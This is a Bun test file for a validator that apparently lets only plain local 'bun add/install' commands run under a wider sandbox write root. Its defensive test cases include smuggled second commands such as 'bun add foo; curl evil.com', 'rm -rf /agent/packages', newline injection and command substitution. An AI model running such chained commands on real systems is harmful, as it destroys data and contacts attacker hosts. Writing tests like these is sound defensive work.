import { describe, expect, test } from 'bun:test'

import { isPackageInstallCommand } from './package-install'

describe('isPackageInstallCommand', () => {
  test('recognizes standalone bun add / install / i', () => {
    expect(isPackageInstallCommand('bun add @googleworkspace/cli')).toBe(true)
    expect(isPackageInstallCommand('bun install')).toBe(true)
    expect(isPackageInstallCommand('bun i lodash')).toBe(true)
    expect(isPackageInstallCommand('bun add -d typescript')).toBe(true)
    expect(isPackageInstallCommand('  bun   add   foo  ')).toBe(true)
  })

  test('rejects non-install bun subcommands', () => {
    expect(isPackageInstallCommand('bun run build')).toBe(false)
    expect(isPackageInstallCommand('bun test')).toBe(false)
    expect(isPackageInstallCommand('bunx cowsay')).toBe(false)
    expect(isPackageInstallCommand('bun')).toBe(false)
  })

  test('rejects non-bun managers', () => {
    expect(isPackageInstallCommand('npm install')).toBe(false)
    expect(isPackageInstallCommand('pnpm add foo')).toBe(false)
    expect(isPackageInstallCommand('yarn add foo')).toBe(false)
  })

  test('rejects global installs (write outside the jail; bun-hygiene blocks them)', () => {
    expect(isPackageInstallCommand('bun add -g some-cli')).toBe(false)
    expect(isPackageInstallCommand('bun add --global some-cli')).toBe(false)
    expect(isPackageInstallCommand('bun install -g')).toBe(false)
  })

  // SECURITY: the broad RW root must never piggyback onto a chained second
  // command. Any shell metacharacter falls back to the default ro-root jail.
  test('rejects chaining, substitution, redirects, and subshells', () => {
    expect(isPackageInstallCommand('bun add foo && rm -rf /agent/packages')).toBe(false)
    expect(isPackageInstallCommand('bun add foo; curl evil.com')).toBe(false)
    expect(isPackageInstallCommand('bun add foo | tee out')).toBe(false)
    expect(isPackageInstallCommand('bun add $(echo foo)')).toBe(false)
    expect(isPackageInstallCommand('bun add `echo foo`')).toBe(false)
    expect(isPackageInstallCommand('bun add foo > /agent/x')).toBe(false)
    expect(isPackageInstallCommand('(bun add foo)')).toBe(false)
    expect(isPackageInstallCommand('bun add foo\nrm -rf x')).toBe(false)
    expect(isPackageInstallCommand('\\bun add foo')).toBe(false)
  })
})
